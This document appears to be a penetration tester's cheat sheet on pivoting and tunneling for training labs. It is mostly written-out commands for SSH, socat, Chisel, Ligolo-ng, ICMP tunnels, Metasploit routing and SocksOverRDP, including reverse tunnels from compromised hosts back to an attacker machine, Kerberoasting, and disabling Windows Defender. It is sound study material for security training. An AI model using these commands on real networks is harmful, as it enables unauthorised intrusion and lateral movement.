The initial compromised system -- Can be called jump host, pivot host, proxy, foothold  
**Lateral Movement**: . We used the credentials to move laterally to that other device, enabling us to compromise the domain further !!  
**Pivoting**:  more than one nic, cross network boundaries you would not usually have access to  
**Tunneling**: Sending traffic over other protocols ssh, dns, https -- common is ssh tunnel to reach web server  

SOCKS proxies are currently of two types: SOCKS4 and SOCKS5.  
SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that  

**Port Forwarding with linux tool socat**  
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432  //listens on 2345 and forwards to target:port  
psql -h 10.1.1.1 -p 2345 -U postgress  //connect to db via socat    
//can use this in combination of others to extend reach further  
//just forwards recieved traffic on port to target  

**SSH Local Port forwarding**: reach target sql service over ssh when sql port is not reachable directly !!  
ssh -L 1234:SQLSERVERIP:3306 ubuntu@10.129.202.64      //now interact with local port 1234 to interact with remote SQL.  
ssh -L 1234:SQLSERVERIP:3306 -L 8080:WEBSERVERIP:80 ubuntu@10.129.202.64     //multiple ports  
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215  
//reach 3rd network from kali by connecting to 4455 of initial access.. which has access to 2nd that can access 3rd..  
ssh -N -L 0.0.0.0:5432:127.0.0.1:5432 christine@10.129.228.195  //this for accessing local service port not exposed !  
nmap -v -sV -p1234 localhost    //scan localport  

**SSH Dynamic port forwarding**: send all port traffic over proxychains .. to reach other network interfaces  
some cases, software is not SOCKS-compatible by default  
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215  
//creates a socks on initial access, which can reach 2nd network that has access to 3rd network.. configure socks to reach 3rd network from kali  
ssh -D 9999 ubuntu@10.129.202.64     //allows to reach second network  
cat /etc/proxychains4.conf  // add socks4 127.0.0.1 9999  
proxychains nmap -v -sn 172.16.5.1-200  //reach second network from kali Full TCP connect works no sS use sT  
Proxychains msfconsole  
Proxychains xfreerdp /v:172.16.1.1 /u:victor /p:pass@123  
Proxychains rdesktop 10.10.10.4  
Proxychains Remmina  
Proxychains GetUserSPNS.py marvel.local/fcastle:Password1 –dc-ip 10.1.1.1 -request  

**SSH remote port forwarding**: aka revere forwarding, the listener on ssh server and client does forwarding  
ssh incoming blocked but not outgoing  
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4  //creates a listener on server i.e kali on 2345  
//client in this case initial access machine forwards traffic to 2nd network ..  
psql -h 127.0.0.1 -p 2345 -U postgres  //on kali forwards traffic to SQL server  

**SSH Remote dynamic port forwarding**:  
ssh -N -R 9998 kali@192.168.118.4  //starts listener on kali ssh server  
socks5 127.0.0.1 9998  //add to /etc/proxychains4.conf  
//client in this case initial access machine forwards traffic all ports to 2nd network ..  
psql -h 127.0.0.1 -p 2345 -U postgres  //on kali forwards traffic to SQL server  

**Rpivot**  
git clone https://github.com/klsecservices/rpivot.git  
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0  //on kali  
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999  //connect to kali from client  
proxychains wget 172.16.5.135:80    --- reach second net  

**LigoloNG**   
Use Ligolo-ng: when no ssh forwarding enabled on the box.  
on kali:  
sudo ip tuntap add user kali mode tun ligolo   //adds new interface  
ip route list   //check routes  
sudo ip route del 192.168.98.0/24 dev tun0   //deletes if any routes already added by vpn  
sudo ip link set ligolo up    //starts the newly created interface //it will still be down until we start proxy  
sudo ip route add 192.168.98.0/24 dev ligolo  //route the target via new ligolo interface  
//Download older or newer versions of ligolo-ng proxy and agent  
./proxy -selfcert –laddr 0.0.0.0:443   //starts the proxy on kali listening on 443 with selfcert// now the interface is up – check ip route list  
on Target:  
Copy the agent to the target and make it executable..  
./agent -connect 10.10.200.X:443 --ignore-cert   //connect agent to proxy on kali IP 443 port --  
//One the agent joins the proxy server – shows agent joined //its double hyphens - -  
on Kali:  
session    //lists the available agent sessions //select the agent  
start    //start the tunneling on the newly created interface !!  
//Now the nmap or fping scans should work on the new network !!  

**Sshuttle**  
regular case..  
sudo sshuttle -r username@remote-server-ip 10.1.2.0/24  //from kali to 2nd network  
with a Twist ..  
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22   //listening on 2222 of first net, forwarding to 2nd net  
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24   //socat to reach 3rd network from kali via 1st net  
kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   

**Chisel**: socks5 tunneling  
https://github.com/jpillora/chisel/releases      //download chisel  
---Forward---  
./chisel server -v -p 1234 --socks5  //on target  
./chisel client -v 10.129.202.64:1234 socks  //on kali, starts a socks on port 1080 configure socks, use proxychains  
---reverse---  
sudo ./chisel server --reverse -v -p 1234 --socks5  //on kali  
./chisel client -v 10.10.14.17:1234 R:socks  //on target connect to kali, config socks 1080 on kali and use proxychains   

**ICMP tunneling with socks5**  
git clone https://github.com/utoni/ptunnel-ng.git  
sudo ./autogen.sh  
sudo ./ptunnel-ng -r10.129.202.64 -R22   //on target, ip of target only  
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22  //on kali, starts a listener on local port 2222  
ssh -p2222 -lubuntu 127.0.0.1  //connects to target over icmp tunnel    
ssh -D 9050 -p2222 -lubuntu 127.0.0.1  //ssh dynamic port forwarding to target  
proxychains nmap -sV -sT 172.16.5.19 -p3389   //reach 2nd net of target  

**DNS Tunneling with Dnscat2**  
google  

**with msfconsole**   
msf6 > use auxiliary/server/socks_proxy  
set SRVPORT 9050  
set SRVHOST 0.0.0.0    
set version 4a    
Run   //now confi socks /etc/proxychains.conf for port  
//starts a sock son port 9050 //next conf meterpreter to route network traffic  
meterpreter > run autoroute -s 172.16.5.0/23  //route through meterpreter  
proxychains nmap 172.16.5.19 -p3389 -sT -v –Pn  
---port forwarding---  
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19  
xfreerdp /v:localhost:3300 /u:victor /p:pass@123  
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18   //reverse port forwarding  

## Windows  
On Windows versions with SSH installed,  
we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default  
#### ssh.exe  
same commands work, reverse forwarding mostly as ssh server not common on windows first target  
try both remote and dynamic remote forwarding commands  
think - case to case basis  

#### ligolo - use windows client - works as well  

#### plink.exe -- putty cli  
no ssh client, then download plink.exe and establish  
copy to target /usr/share/windows-resources/binaries/plink.exe  
plink.exe -ssh -l kali -pw kalipassword -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4  //192 is kali ip  
//reverse port forwarding - starts listener on kali:9833 which forwards traffic to localhost 3389 when rdp is not exposed  
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833   //rdp to target  
plink -ssh -D 9050 ubuntu@10.129.15.50  //so this is to ubuntu not windows or can be windows if ssh running..  

#### Netsh  
requires admin privileges on windows target to create route and enable firewall rules  
google !! too much  

**RDP and SOCKS tunneling with SocksOverRDP**  
only windows env, no ssh  
https://github.com/nccgroup/SocksOverRDP/releases  
https://www.proxifier.com/download/#win-tab  
transfer the files SocksOverRDP-Plugin.dll, SocksOverRDP-Server.exe and the Proxifier PE directory,  
to the spawned Windows target 10.x.x.x – turn off windws defender if possible before copying files  
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll  //on first windows  
rdp to next windows machine 172.x.x.x   //from 1st to 2nd  
prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080  
transfer SocksOverRDP-Server.exe to 2nd windows target, - again disbale defender  
Run the copied SOckoverRDP-server.exe as adminitrator   //on 2nd windows  
RUn the proxyfier on first windows as admin  //on 1st windows  
set 127.0.0.1:1080 as the proxy's socket and use SOCKS5:  
Now can reach from first windows those targets only reacahable to second machine directly from first mahcine 10.X.X.X.X  
google for more info  

**Labs**:  
Enterprise, Inception, REddish, Dante, Offshore, Rasta, Ascension  
